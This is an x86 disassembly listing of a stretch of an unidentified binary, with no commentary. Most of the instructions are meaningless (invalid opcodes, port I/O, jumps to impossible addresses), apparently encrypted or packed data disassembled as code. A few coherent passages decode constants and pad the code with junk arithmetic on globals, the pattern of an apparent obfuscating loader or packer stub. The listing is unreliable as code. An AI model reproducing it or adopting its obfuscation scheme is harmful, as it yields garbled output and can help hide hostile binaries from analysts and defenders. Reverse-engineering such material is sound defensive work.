  406283:	cld    
  406284:	ror    DWORD PTR [edi+0xf08de1],cl
  40628a:	or     BYTE PTR [edi+eiz*2+0x13],al
  40628e:	in     eax,dx
  40628f:	xor    dl,BYTE PTR [edx-0xe3803ec]
  406295:	iret   
  406296:	pop    ss
  406297:	rcr    BYTE PTR [eax-0x2402e610],cl
  40629d:	ja     0x40624c
  40629f:	out    0x59,al
  4062a1:	jecxz  0x40625f
  4062a3:	sub    BYTE PTR [edi+ecx*4+0x50],0x32
  4062a8:	xor    eax,0x10027833
  4062ad:	aam    0xaa
  4062af:	dec    esi
  4062b0:	mov    BYTE PTR [ebp-0x40f7b486],0xd4
  4062b7:	sbb    al,0x80
  4062b9:	out    dx,al
  4062ba:	mov    ebp,0x7d6d49ae
  4062bf:	fisubr WORD PTR [edi]
  4062c2:	mov    ecx,0x263385e2
  4062c7:	int    0x95
  4062c9:	ret    
  4062ca:	dec    edx
  4062cb:	inc    esp
  4062cc:	scas   eax,DWORD PTR es:[edi]
  4062cd:	and    al,0x19
  4062cf:	mov    bl,0x71
  4062d1:	movzx  edi,bl
  4062d4:	add    edi,DWORD PTR [ebx-0x219fe55a]
  4062da:	add    al,0x3d
  4062dc:	in     al,dx
  4062dd:	gs add al,ch
  4062e0:	shl    DWORD PTR [eax+0x5e],1
  4062e3:	iret   
  4062e4:	push   ss
  4062e5:	add    cl,BYTE PTR [eax+eax*2+0x55]
  4062e9:	(bad)  
  4062ea:	and    esi,DWORD PTR [eax+0x3cff6b54]
  4062f0:	sbb    al,0x44
  4062f2:	xchg   ebp,eax
  4062f3:	in     al,dx
  4062f4:	enter  0x8c7e,0xd1
  4062f8:	repnz scas eax,DWORD PTR es:[edi]
  4062fa:	popa   
  4062fb:	sbb    DWORD PTR [ebx],ecx
  4062fd:	(bad)
  406301:	jmp    0x2c62a99c
  406306:	icebp  
  406307:	add    al,BYTE PTR [ebx+0x707b04af]
  40630d:	xchg   esp,eax
  40630e:	loopne 0x4062a1
  406310:	inc    ebp
  406311:	repnz retf 0xacd4
  406315:	sbb    DWORD PTR [esi-0x66],edx
  406318:	xchg   edi,eax
  406319:	mov    dl,0xba
  40631b:	fsubp  st(0),st
  40631d:	(bad)
  406320:	add    ah,BYTE PTR [esi-0x584cafd5]
  406326:	(bad)  
  406327:	adc    dh,BYTE PTR [eax]
  406329:	sbb    ch,ah
  40632b:	scas   al,BYTE PTR es:[edi]
  40632c:	push   edx
  40632d:	rol    BYTE PTR [esi+0x39],1
  406330:	mov    ah,0x6b
  406332:	xchg   BYTE PTR [esi],dh
  406334:	imul   edi,DWORD PTR [ecx+0x223db69f],0x378e3e27
  40633e:	(bad)
  406341:	jae    0x4063ab
  406343:	loopne 0x406374
  406345:	mov    eax,0x2d370882
  40634a:	push   0xbefe7337
  40634f:	in     al,0xbe
  406351:	cwde   
  406352:	jge    0x406386
  406354:	test   eax,0xb3205598
  406359:	and    ah,BYTE PTR [ebp-0x30]
  40635c:	fld    TBYTE PTR [ecx+0x1a]
  40635f:	pop    esp
  406360:	push   es
  406361:	leave  
  406362:	push   ebp
  406363:	push   esi
  406364:	sub    eax,0xc906562f
  406369:	daa    
  40636a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40636b:	inc    ebx
  40636c:	pushf  
  40636d:	stc    
  40636e:	imul   esp,DWORD PTR [ebp+0xe],0xffffffa5
  406372:	hlt    
  406373:	jg     0x40633b
  406375:	inc    ebp
  406376:	ror    BYTE PTR ds:0x2dd8ca31,0x2e
  40637d:	xchg   ecx,eax
  40637e:	fld    TBYTE PTR [ecx+0x45595d43]
  406384:	dec    edi
  406385:	sub    esp,0xfffffff6
  406388:	mov    ah,0xe4
  40638a:	in     al,0xfb
  40638c:	dec    DWORD PTR [ecx]
  40638e:	jmp    0x85fd:0x11491d9a
  406395:	js     0x406325
  406397:	push   0x33
  406399:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40639a:	add    BYTE PTR [esi-0x2d43040e],0xf1
  4063a1:	and    BYTE PTR [ebx],bh
  4063a3:	jno    0x4063e4
  4063a5:	pop    esi
  4063a6:	repz (bad) 
  4063a8:	sar    BYTE PTR [ebp-0x5b],1
  4063ab:	or     al,0x65
  4063ad:	mov    edi,0xd386989c
  4063b2:	pop    edi
  4063b3:	sub    DWORD PTR [edx],ebp
  4063b5:	xchg   ebx,eax
  4063b6:	(bad)  
  4063b7:	adc    eax,0xede04b66
  4063bc:	add    DWORD PTR [ebx-0x6d],esp
  4063bf:	cmp    ch,bh
  4063c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063c2:	mov    ebx,0x7e7a0bf3
  4063c7:	push   cs
  4063c8:	repz in al,0x5
  4063cb:	loope  0x4063e1
  4063cd:	push   0x629a16ed
  4063d2:	ds leave 
  4063d4:	outs   dx,BYTE PTR ds:[esi]
  4063d5:	jae    0x406424
  4063d7:	cmp    ah,BYTE PTR cs:[eax-0x4d]
  4063db:	jae    0x406365
  4063dd:	rcr    bh,0xa6
  4063e0:	ds push 0xe31af41a
  4063e6:	gs jmp 0x4063b3
  4063e9:	mov    cl,0xe1
  4063eb:	popa   
  4063ec:	sbb    dl,0xaa
  4063ef:	bound  esi,QWORD PTR [eax]
  4063f1:	lds    esi,FWORD PTR [ebp+0x785bc821]
  4063f7:	push   edx
  4063f8:	stos   DWORD PTR es:[edi],eax
  4063f9:	aas    
  4063fa:	gs jns 0x4063b4
  4063fd:	int3   
  4063fe:	repz mov ecx,0xe8dfc9c4
  406404:	inc    eax
  406405:	inc    eax
  406406:	sub    eax,0x8a8a5ee5
  40640b:	add    BYTE PTR [esi+0x8],ah
  40640e:	pop    ecx
  40640f:	push   0x5
  406411:	or     BYTE PTR [esi-0x43],bh
  406414:	pop    edx
  406415:	leave  
  406416:	cdq    
  406417:	addr16 push ds
  406419:	sbb    ecx,DWORD PTR [edx+0x57]
  40641c:	iret   
  40641d:	std    
  40641e:	icebp  
  40641f:	stc    
  406420:	mov    ebx,0x63e2d2d2
  406425:	jmp    0x34d4:0xfe8f2526
  40642c:	xchg   edx,eax
  40642d:	jmp    0x406415
  40642f:	cmp    ebx,DWORD PTR [esi-0x6]
  406432:	mov    eax,ds:0x49e9d610
  406437:	scas   al,BYTE PTR es:[di]
  406439:	mov    bh,0x36
  40643b:	inc    esp
  40643c:	std    
  40643d:	add    ebx,DWORD PTR ds:0x1b53fef1
  406443:	aam    0x7a
  406445:	mov    eax,ds:0x81e04589
  40644a:	xor    eax,0x434386
  40644f:	hlt    
  406450:	es inc ebx
  406452:	add    bh,al
  406454:	inc    ebp
  406455:	fdiv   DWORD PTR [ecx]
  406457:	mov    ch,0x9c
  406459:	clc    
  40645a:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406461:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406468:	xor    DWORD PTR ds:0x432de2,edx
  40646e:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406475:	xor    eax,DWORD PTR ds:0x43439a
  40647b:	mov    eax,DWORD PTR [ebp-0xc]
  40647e:	sub    DWORD PTR ds:0x432de2,0x4326f0
  406488:	xor    eax,esi
  40648a:	add    DWORD PTR ds:0x4326f0,0x5eb6
  406494:	add    eax,edi
  406496:	adc    DWORD PTR ds:0x432dd6,0x2bbb
  4064a0:	mov    DWORD PTR [ebp-0x18],eax
  4064a3:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  4064aa:	sbb    eax,0x6f73
  4064af:	mov    BYTE PTR [ebp-0x1],0x67
  4064b3:	or     eax,0xf78
  4064b8:	mov    eax,DWORD PTR [ebp-0xc]
  4064bb:	xor    eax,esi
  4064bd:	add    eax,edi
  4064bf:	mov    DWORD PTR [ebp-0x18],eax
  4064c2:	neg    eax
  4064c4:	mov    eax,DWORD PTR [ebp-0x24]
  4064c7:	sbb    DWORD PTR ds:0x4326ec,0x6660
  4064d1:	xor    eax,esi
  4064d3:	add    eax,edi
  4064d5:	sub    DWORD PTR ds:0x43442d,0x50c
  4064df:	push   eax
  4064e0:	sbb    DWORD PTR ds:0x4326f0,edx
  4064e6:	mov    eax,DWORD PTR [ebp-0x28]
  4064e9:	sub    DWORD PTR ds:0x432dd2,0x7292
  4064f3:	xor    eax,esi
  4064f5:	adc    DWORD PTR ds:0x43438e,0x434415
  4064ff:	add    eax,edi
  406501:	push   eax
  406502:	add    DWORD PTR ds:0x434386,ebx
  406508:	mov    eax,DWORD PTR [ebp-0x1c]
  40650b:	add    DWORD PTR ds:0x432dbe,0x432de6
  406515:	xor    eax,esi
  406517:	add    eax,edi
  406519:	add    DWORD PTR ds:0x434411,0x43441d
  406523:	push   eax
  406524:	lea    eax,[ebp-0x78]
  406527:	push   eax
  406528:	push   DWORD PTR [ebp-0xc]
  40652b:	adc    DWORD PTR ds:0x434386,0x78bf
  406535:	push   DWORD PTR [ebp-0x14]
  406538:	call   0x4055a2
  40653d:	sub    DWORD PTR ds:0x43439a,0x4326fc
  406547:	jmp    0x406894
  40654c:	test   al,0x25
  40654e:	xor    al,0x4
  406550:	mov    cl,0x11
  406552:	test   al,0xb1
  406554:	push   ebx
  406555:	fcmovb st,st(7)
  406557:	(bad)  
  406559:	add    BYTE PTR [ebp-0x6c],ah
  40655c:	imul   edi,DWORD PTR [esi],0x70
  40655f:	jo     0x406581
  406561:	jge    0x4065d3
  406563:	jo     0x4065df
  406565:	or     eax,0x3851464e
  40656a:	mov    ds:0x2493b1bb,eax
  40656f:	ror    DWORD PTR [edi+0x4e],cl
  406572:	neg    BYTE PTR [edx-0x40]
  406575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406576:	loope  0x406505
  406578:	cmp    bh,bl
  40657a:	jmp    0x40651e
  40657c:	inc    ecx
  40657d:	imul   eax,DWORD PTR [ecx+0x19],0xde5b70ef
  406584:	or     al,0x8c
  406586:	jl     0x40653b
  406588:	or     sp,WORD PTR [edx-0x76]
  40658c:	es or  al,0x31
  40658f:	inc    esi
  406590:	push   esi
  406591:	rcr    al,1
  406593:	mov    ds:0x87c06802,eax
  406598:	xchg   edx,eax
  406599:	fwait
  40659a:	push   0x6fccd5c6
  40659f:	retf   0xc495
  4065a2:	int3   
  4065a3:	outs   dx,DWORD PTR ds:[esi]
  4065a4:	dec    esp
  4065a5:	lds    ebx,FWORD PTR [eax-0x33]
  4065a8:	push   ebp
  4065a9:	sar    ah,cl
  4065ab:	cmp    eax,0x70864f0e
  4065b0:	arpl   WORD PTR [esi],di
  4065b2:	mov    edx,0x732e32c4
  4065b7:	imul   eax,ebp,0x1
  4065ba:	in     al,dx
  4065bb:	test   al,0x55
  4065bd:	cdq    
  4065be:	or     DWORD PTR [ebp-0x39],ecx
  4065c1:	jl     0x4065e6
  4065c3:	mov    BYTE PTR [ecx+0x495cbb03],dh
  4065c9:	xchg   BYTE PTR [ebx-0x31],dl
  4065cc:	in     al,0x85
  4065ce:	das    
  4065cf:	push   esp
  4065d0:	jle    0x406587
  4065d2:	cmp    al,0x4e
  4065d4:	sub    BYTE PTR [ebx],bh
  4065d6:	int    0x5f
  4065d8:	mov    al,ds:0xec7c68a0
  4065dd:	in     eax,dx
  4065de:	dec    ecx
  4065df:	mov    dl,0x3d
  4065e1:	fwait
  4065e2:	mov    ah,0x8e
  4065e4:	test   eax,0x3a0ef419
  4065e9:	push   esp
  4065ea:	outs   dx,DWORD PTR ds:[esi]
  4065eb:	iret   
  4065ec:	jne    0x406643
  4065ee:	out    0xf4,al
  4065f0:	dec    esi
  4065f1:	mov    ecx,0x93e0d772
  4065f6:	test   al,0x47
  4065f8:	outs   dx,DWORD PTR ds:[esi]
  4065f9:	sub    eax,0x57264f6e
  4065fe:	ret    
  4065ff:	ror    BYTE PTR [ebx],1
  406601:	jbe    0x40667f
  406603:	sar    BYTE PTR [ebp+0x27],0xec
  406607:	mov    bl,0xb9
  406609:	mov    edi,0xe5db5819
  40660e:	ror    BYTE PTR [esi-0x5c145502],0x38
  406615:	data16 cmp BYTE PTR ds:[ebp+0x77d4122e],0xee
  40661e:	fcomp  QWORD PTR [eax]
  406620:	pushf  
  406621:	dec    ecx
  406622:	push   ds
  406623:	inc    ecx
  406624:	arpl   WORD PTR [esp+ebp*2+0x1b547b3],bp
  40662b:	jae    0x4065eb
  40662d:	pop    edi
  40662e:	pop    ds
  40662f:	add    al,0xb7
  406631:	or     al,0xd0
  406633:	popf   
  406634:	jo     0x406628
  406636:	into   
  406637:	push   0x1e662706
  40663c:	jns    0x4065da
  40663e:	add    DWORD PTR [edx-0x7b94808e],ebx
  406644:	stos   DWORD PTR es:[edi],eax
  406645:	cdq    
  406646:	push   ds
  406647:	cld    
  406648:	pop    ss
  406649:	repz rcr DWORD PTR [ebx+ecx*8+0x75],0x3
  40664f:	mov    eax,ds:0x3a2696bb
  406654:	std    
  406655:	inc    ebp
  406656:	cmp    al,0xed
  406658:	sahf   
  406659:	ja     0x40668e
  40665b:	adc    eax,0x9577057e
  406660:	aaa    
  406661:	test   eax,esp
  406663:	aad    0x87
  406665:	loopne 0x4065eb
  406667:	sub    eax,0x51d91fff
  40666c:	pop    es
  40666d:	shl    dh,cl
  40666f:	sar    BYTE PTR [ebp-0x717c690b],0xf1
  406676:	inc    edi
  406677:	sahf   
  406678:	and    ebp,ebp
  40667a:	pop    esi
  40667b:	inc    esp
  40667c:	aad    0x64
  40667e:	int3   
  40667f:	add    DWORD PTR [eax-0x5ac9f0e7],ecx
  406685:	lods   al,BYTE PTR ds:[esi]
  406686:	fnstenv [ecx+0x5bf219bc]
  40668c:	sub    BYTE PTR [edi-0x7f],al
  40668f:	addr16 mov al,ss:0xf6d0
  406694:	sahf   
  406695:	dec    edx
  406696:	std    
  406697:	leave  
  406698:	test   al,0x29
  40669a:	pop    ss
  40669b:	inc    edx
  40669c:	cmp    al,0x66
  40669e:	mov    dh,0xfd
  4066a0:	add    al,0xa7
  4066a2:	hlt    
  4066a3:	int    0x5f
  4066a5:	adc    dh,BYTE PTR [ebx+0x7e1cd826]
  4066ab:	loop   0x406630
  4066ad:	loopne 0x4066cb
  4066af:	daa    
  4066b0:	ret    
  4066b1:	mov    ecx,0x3c128477
  4066b6:	add    ebx,DWORD PTR fs:[edi-0x45093530]
  4066bd:	les    ebx,FWORD PTR [esp+ebx*2-0x46dd9b9a]
  4066c4:	retf   0x9c87
  4066c7:	xor    edx,DWORD PTR ds:0xa2420647
  4066cd:	test   al,0xd4
  4066cf:	pop    ecx
  4066d0:	and    edx,DWORD PTR [edx-0x6a]
  4066d3:	iret   
  4066d4:	data16 je 0x4066a2
  4066d7:	icebp  
  4066d8:	push   cs
  4066d9:	out    dx,al
  4066da:	cmp    DWORD PTR [ecx+0x712e3a9a],edi
  4066e0:	inc    eax
  4066e1:	sahf   
  4066e2:	adc    BYTE PTR ds:0x99ce083d,bl
  4066e8:	into   
  4066e9:	jb     0x406731
  4066eb:	jmp    0x406764
  4066ed:	xchg   ebx,eax
  4066ee:	xor    DWORD PTR [ebp-0x2b],eax
  4066f1:	ror    BYTE PTR [ebp-0x78],0x8f
  4066f5:	rcl    DWORD PTR [edi],1
  4066f7:	fdiv   QWORD PTR [esi+0x2c]
  4066fa:	xchg   esp,eax
  4066fb:	cmp    BYTE PTR [esi+0x1d],0xe
  4066ff:	mov    dl,0x24
  406701:	lods   al,BYTE PTR ds:[esi]
  406702:	push   ebx
  406703:	rol    DWORD PTR [ebx-0x74],cl
  406706:	dec    ecx
  406707:	cmp    eax,0x63106cc1
  40670c:	int3   
  40670d:	rol    BYTE PTR [edx+0x3f615a43],0x5f
  406714:	arpl   WORD PTR [edx],bx
  406716:	inc    ebp
  406717:	es scas al,BYTE PTR es:[edi]
  406719:	xchg   ecx,eax
  40671a:	test   BYTE PTR [ebx],ah
  40671c:	je     0x406725
  40671e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40671f:	cli    
  406720:	sbb    ah,BYTE PTR [edi+eiz*1-0x44]
  406724:	hlt    
  406725:	(bad)  
  406726:	push   ss
  406727:	push   ss
  406728:	lock adc esp,esi
  40672b:	outs   dx,BYTE PTR ds:[esi]
  40672c:	daa    
  40672d:	aas    
  40672e:	out    dx,al
  40672f:	inc    esi
  406730:	cmc    
  406731:	aam    0x92
  406733:	pop    edx
  406734:	xlat   BYTE PTR ds:[ebx]
  406735:	je     0x4066b8
  406737:	popa   
  406738:	repz add eax,0x96ae3a82
  40673e:	outs   dx,BYTE PTR ds:[esi]
  40673f:	pusha  
  406740:	mov    esp,0x21939a3a
  406745:	mov    bl,0x46
  406747:	mov    ds:0x3d27abb9,al
  40674c:	outs   dx,BYTE PTR ds:[esi]
  40674d:	(bad)  
  40674e:	cli    
  40674f:	fwait
  406750:	mov    al,0x1e
  406752:	adc    BYTE PTR [edx+0x40ad8b56],al
  406758:	push   ss
  406759:	add    eax,0xfe424d9a
  40675e:	ss aad 0xc2
  406761:	adc    al,0xa2
  406763:	shl    DWORD PTR [ebp-0x59c7ebbd],1
  406769:	mov    BYTE PTR ss:0xdabb20b6,ah
  406770:	aam    0x83
  406772:	out    dx,eax
  406773:	retf   
  406774:	data16 fstp QWORD PTR [ecx]
  406777:	ins    BYTE PTR es:[edi],dx
  406778:	arpl   WORD PTR [edx+0x3f],sp
  40677b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40677c:	jbe    0x406721
  40677e:	inc    eax
  40677f:	xlat   BYTE PTR ds:[ebx]
  406780:	test   BYTE PTR [ebx+0x3933123f],0xa3
  406787:	adc    DWORD PTR [edx+edx*1],ecx
  40678a:	lock (bad) 
  40678c:	xchg   edx,eax
  40678d:	xchg   edx,eax
  40678e:	add    eax,0xd51d1714
  406793:	in     al,dx
  406794:	sub    al,cl
  406796:	dec    edx
  406797:	jmp    0x4067e1
  406799:	out    dx,al
  40679a:	sbb    eax,0x37fcd6cd
  40679f:	repz lock cmp eax,0xb1c69d2
  4067a6:	sbb    DWORD PTR [edx+0x24c22b37],esp
  4067ac:	jne    0x406808
  4067ae:	sar    DWORD PTR [eax-0x26],0x65
  4067b2:	sahf   
  4067b3:	jmp    0xa603:0xd6799c18
  4067ba:	loop   0x4067b0
  4067bc:	mov    eax,0xd9bca0ea
  4067c1:	dec    esi
  4067c2:	loopne 0x406760
  4067c4:	sbb    esi,0x73
  4067c7:	cmp    al,0xf9
  4067c9:	in     al,dx
  4067ca:	leave  
  4067cb:	xchg   ecx,eax
  4067cc:	cmp    eax,0xe275efef
  4067d1:	frstor [ebx+0x23cd45c7]
  4067d7:	jle    0x4067ba
  4067d9:	push   edx
  4067da:	xor    al,0xb4
  4067dc:	add    eax,0x34c17480
  4067e1:	jnp    0x406821
  4067e3:	loopne 0x406771
  4067e5:	sti    
  4067e6:	mov    esi,0x368ebba9
  4067eb:	repnz sbb dh,BYTE PTR [ebp+0x5f]
  4067ef:	test   DWORD PTR [ebp-0x6806fdef],0x93722731
  4067f9:	and    eax,0xfe16052e
  4067fe:	and    edi,DWORD PTR es:[ecx+0x4b]
  406802:	mov    ecx,0xb4dd79f4
  406807:	pop    eax
  406808:	sbb    al,0xb7
  40680a:	jmp    0xde8dfcca
  40680f:	jecxz  0x406803
  406811:	xor    BYTE PTR ds:0x1344d417,ch
  406817:	in     eax,0xf3
  406819:	xor    eax,0xa36d8990
  40681e:	jae    0x4067e4
  406820:	loope  0x4067ea
  406822:	ficom  DWORD PTR [ecx+edx*1-0x49]
  406826:	jbe    0x4067f9
  406828:	ins    DWORD PTR es:[edi],dx
  406829:	mov    dh,0x2e
  40682b:	pop    edi
  40682c:	xlat   BYTE PTR ds:[ebx]
  40682d:	aad    0x4c
  40682f:	mov    DWORD PTR [edi-0x37],esp
  406832:	aaa    
  406833:	in     al,dx
  406834:	in     al,dx
  406835:	cmp    bl,ch
  406837:	stc    
  406838:	adc    eax,0x607a218a
  40683d:	das    
  40683e:	cli    
  40683f:	fdivr  DWORD PTR [edx-0x4]
  406842:	jg     0x4068b7
  406844:	dec    edx
  406845:	jp     0x40683f
  406847:	pop    ebp
  406848:	lahf   
  406849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40684a:	push   ss
  40684b:	adc    DWORD PTR gs:[esi],ecx
  40684e:	out    dx,eax
  40684f:	sub    eax,0x62b183b5
  406854:	loope  0x40684b
  406856:	or     ebx,DWORD PTR [eax+eax*8]
  406859:	push   0x86d4757a
  40685e:	push   es
  40685f:	pop    ss
  406860:	out    0xd,al
  406862:	jae    0x40683e
  406864:	push   es
  406865:	add    DWORD PTR [ebx-0x20cb725],esi
  40686b:	cmp    DWORD PTR [eax],edx
  40686d:	mov    esi,0x54234d15
  406872:	loop   0x4068b3
  406874:	mov    al,0x6b
  406876:	addr16 es adc eax,0x7ea989cc
  40687d:	jb     0x40686f
  40687f:	xchg   DWORD PTR ds:0x367d0dfd,ebx
  406885:	sub    al,0xba
  406887:	cmc    
  406888:	push   ecx
  406889:	hlt    
  40688a:	sub    ch,BYTE PTR [ebx-0x3d3a2f0f]
  406890:	pop    edx
  406891:	in     eax,0x37
  406893:	test   eax,0x5c7c085
  406898:	and    eax,0x71004344
  40689d:	jns    0x40689f
  40689f:	add    BYTE PTR [edi],cl
  4068a1:	test   BYTE PTR [ebp-0x73000000],ch
  4068a7:	inc    ebp
  4068a8:	mov    BYTE PTR [ecx+0x432dca1d],al
  4068ae:	add    BYTE PTR [ebx+0x5000001e],ah
  4068b4:	sbb    DWORD PTR ds:0x432de6,0x1ec2
  4068be:	mov    eax,DWORD PTR [ebp-0x14]
  4068c1:	and    DWORD PTR ds:0x432de2,0x7d59
  4068cb:	xor    eax,esi
  4068cd:	add    eax,edi
  4068cf:	push   eax
  4068d0:	mov    DWORD PTR ds:0x434366,0x11
  4068da:	cmp    DWORD PTR ds:0x434366,0x0
  4068e1:	je     0x406937
  4068e7:	cmp    DWORD PTR ds:0x434366,0x6
  4068ee:	jne    0x40690c
  4068f4:	push   0x434421
  4068f9:	push   DWORD PTR [ebp-0xc]
  4068fc:	push   0x55d8
  406901:	push   0x8f3f
  406906:	call   DWORD PTR ds:0x432c3a
  40690c:	cmp    DWORD PTR ds:0x434366,0x7
  406913:	jne    0x406924
  406919:	mov    eax,ds:0x434366
  40691e:	dec    eax
  40691f:	mov    ds:0x434366,eax
  406924:	xor    eax,eax
  406926:	add    eax,DWORD PTR ds:0x434366
  40692c:	dec    eax
  40692d:	mov    ds:0x434366,eax
  406932:	jmp    0x4068da
  406937:	mov    eax,DWORD PTR [ebp-0x10]
  40693a:	add    eax,0xaa
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x10]
  406943:	mov    eax,DWORD PTR [eax+0x198]
  406949:	push   DWORD PTR [eax]
  40694b:	call   0x40d076
  406950:	mov    DWORD PTR [ebp-0x8],eax
  406953:	cmp    DWORD PTR [ebp-0x8],0x0
  406957:	lea    eax,[ebp+0x4]
  40695a:	mov    DWORD PTR [ebp-0x20],eax
  40695d:	je     0x407755
  406963:	lea    eax,[ebp-0x18]
  406966:	push   eax
  406967:	mov    eax,DWORD PTR [ebp-0x2c]
  40696a:	xor    eax,esi
  40696c:	add    eax,edi
  40696e:	push   eax
  40696f:	mov    eax,DWORD PTR [ebp-0x1c]
  406972:	xor    eax,esi
  406974:	add    eax,edi
  406976:	push   eax
  406977:	push   DWORD PTR [ebp-0x8]
  40697a:	lea    eax,[ebp-0x78]
  40697d:	push   eax
  40697e:	jmp    0x406ccb
  406983:	mov    esi,?
  406985:	add    BYTE PTR [esi+0xa],bh
  406988:	mov    cs,WORD PTR [edx+0x39f75e8a]
  40698e:	aaa    
  40698f:	es mov ebp,0x3a1b2b0b
  406995:	jo     0x406a07
  406997:	and    BYTE PTR [ebp+0x70],bh
  40699a:	jo     0x406a1b
  40699c:	mov    eax,ds:0xa42869ba
  4069a1:	and    DWORD PTR [edi+ecx*2-0x3],ebx
  4069a5:	hlt    
  4069a6:	ja     0x406998
  4069a8:	out    0xe5,al
  4069aa:	xor    BYTE PTR [esi+ebx*2-0x43],dh
  4069ae:	and    al,0x93
  4069b0:	inc    ebx
  4069b1:	cld    
  4069b2:	mov    al,ds:0x3c4b2a90
  4069b7:	sbb    ecx,esp
  4069b9:	jae    0x4069d6
  4069bb:	jo     0x4069fe
  4069bd:	icebp  
  4069be:	test   DWORD PTR [ebp+edi*2-0x3e],esp
  4069c2:	sbb    edx,DWORD PTR [edi+0x241f870e]
  4069c8:	test   BYTE PTR [ebp+0x32],bh
  4069cb:	adc    al,0x21
  4069cd:	sar    BYTE PTR [edx-0x63],cl
  4069d0:	les    ebx,FWORD PTR [edi]
  4069d2:	in     al,0x13
  4069d4:	int    0x54
  4069d6:	or     ebx,DWORD PTR [edi+0x70]
  4069d9:	jmp    0xaeed0679
  4069de:	shl    DWORD PTR [esi+0x711da580],1
  4069e4:	pop    eax
  4069e5:	retf   
  4069e6:	or     al,0x82
  4069e8:	lods   al,BYTE PTR ds:[esi]
  4069e9:	push   ss
  4069ea:	leave  
  4069eb:	mov    esp,0x910638dd
  4069f0:	cs test al,0x76
  4069f3:	outs   dx,DWORD PTR ds:[esi]
  4069f4:	div    bh
  4069f6:	mov    ebp,DWORD PTR [ebx+0xc912e08]
  4069fc:	xchg   esp,eax
  4069fd:	sbb    al,0xeb
  4069ff:	jge    0x406a0d
  406a01:	mov    ds:0xa514ce44,al
  406a06:	dec    edi
  406a07:	sahf   
  406a08:	retf   0x8311
  406a0b:	and    ebp,ebx
  406a0d:	or     DWORD PTR [edx+0x47],esi
  406a10:	sbb    al,BYTE PTR [edi+0x2ac52fdd]
  406a16:	jle    0x406a1d
  406a18:	test   eax,0x530a050
  406a1d:	inc    ebx
  406a1e:	xor    ebx,edi
  406a20:	push   0xffffffd9
  406a22:	adc    ecx,DWORD PTR [esi+0x35b1993c]
  406a28:	pop    ebp
  406a29:	or     ah,BYTE PTR [edi]
  406a2b:	sub    al,0x8e
  406a2d:	dec    eax
  406a2e:	push   cs
  406a2f:	mov    dl,0xf1
  406a31:	push   ecx
  406a32:	pop    ecx
  406a33:	(bad)  
  406a34:	fs call 0x24b78421
  406a3a:	lods   eax,DWORD PTR ds:[esi]
  406a3b:	jge    0x406a91
  406a3d:	in     al,0xd0
  406a3f:	sub    DWORD PTR [edi+0x76],ebx
  406a42:	pop    DWORD PTR [eax]
  406a44:	stc    
  406a45:	push   esp
  406a46:	ja     0x406a49
  406a48:	push   edi
  406a49:	push   eax
  406a4a:	jle    0x406a57
  406a4c:	mov    al,0x73
  406a4e:	adc    al,al
  406a50:	push   ds
  406a51:	(bad)  
  406a52:	jg     0x406a21
  406a54:	xchg   DWORD PTR [eax+ebp*2],edi
  406a57:	sub    DWORD PTR ds:0xce69e7c9,esp
  406a5d:	add    edx,ebx
  406a5f:	pop    esi
  406a60:	dec    bp
  406a62:	ret    0xade9
  406a65:	mov    ebp,0x469ad32c
  406a6a:	mov    eax,0x2a4e1d67
  406a6f:	and    eax,0x81fa7293
  406a74:	pop    edi
  406a75:	arpl   WORD PTR [edi+0x1ef9dfc5],di
  406a7b:	push   ds
  406a7c:	jmp    0x3193a1c3
  406a81:	push   es
  406a82:	add    al,0x80
  406a84:	clc    
  406a85:	inc    edx
  406a86:	sub    esi,DWORD PTR [edx-0x37]
  406a89:	and    BYTE PTR [esi+0x45900111],0x8d
  406a90:	jnp    0x406a46
  406a92:	sub    DWORD PTR [eax-0x11df0423],ebp
  406a98:	jl     0x406a44
  406a9a:	jmp    0x24ca:0xc6863c38
  406aa1:	mov    dl,0x12
  406aa3:	shl    DWORD PTR [ecx-0x37e17e59],1
  406aa9:	div    DWORD PTR [ecx-0x3f85a1a8]
  406aaf:	addr16 mov bh,0xb1
  406ab2:	shl    BYTE PTR [edi],1
  406ab4:	loope  0x406ab0
  406ab6:	inc    eax
  406ab7:	outs   dx,DWORD PTR ds:[esi]
  406ab8:	cmp    al,0x12
  406aba:	fnstsw WORD PTR [ecx-0x69310d58]
  406ac0:	sub    eax,0x2e292650
  406ac5:	sub    BYTE PTR [ebx-0x150b1ad9],dl
  406acb:	cmp    ah,dl
  406acd:	scas   al,BYTE PTR es:[edi]
  406ace:	mov    eax,0xc3177087
  406ad3:	xor    ecx,DWORD PTR [esp+ebp*1-0x4b4d18f1]
  406ada:	dec    esp
  406adb:	cmp    DWORD PTR [eax+0x20d83d62],0xd53188c5
  406ae5:	pop    esi
  406ae6:	mov    ebp,0xa1d1789c
  406aeb:	xchg   edi,eax
  406aec:	pop    ecx
  406aed:	addr16 cwde 
  406aef:	psubsb mm2,mm3
  406af2:	add    eax,0x282443b3
  406af7:	js     0x406a98
  406af9:	or     esi,DWORD PTR [esi]
  406afb:	dec    edi
  406afc:	pusha  
  406afd:	mov    ch,BYTE PTR [eax]
  406aff:	dec    eax
  406b00:	stos   BYTE PTR es:[edi],al
  406b01:	jle    0x406ad5
  406b03:	pop    edx
  406b04:	fninit 
  406b06:	fs or  al,0xb8
  406b09:	and    ecx,eax
  406b0b:	mov    al,0x13
  406b0d:	cdq    
  406b0e:	(bad)
  406b12:	push   0x6527a329
  406b17:	out    0xc9,eax
  406b19:	shl    edx,cl
  406b1b:	sbb    edx,DWORD PTR [edx-0x3e5ef38c]
  406b21:	sub    BYTE PTR [edi-0x5632336],bh
  406b27:	test   BYTE PTR [edx-0x5d],ch
  406b2a:	out    0x41,al
  406b2c:	xchg   ebp,eax
  406b2d:	or     bl,BYTE PTR [ebx+edx*1+0x6f2b6dcf]
  406b34:	or     ah,BYTE PTR [ecx+0x60c9c711]
  406b3a:	cmp    DWORD PTR [edx+0x3e],0xdf5636c4
  406b41:	and    eax,edi
  406b43:	call   0xc947:0xbe7f86c6
  406b4a:	inc    esi
  406b4b:	in     eax,dx
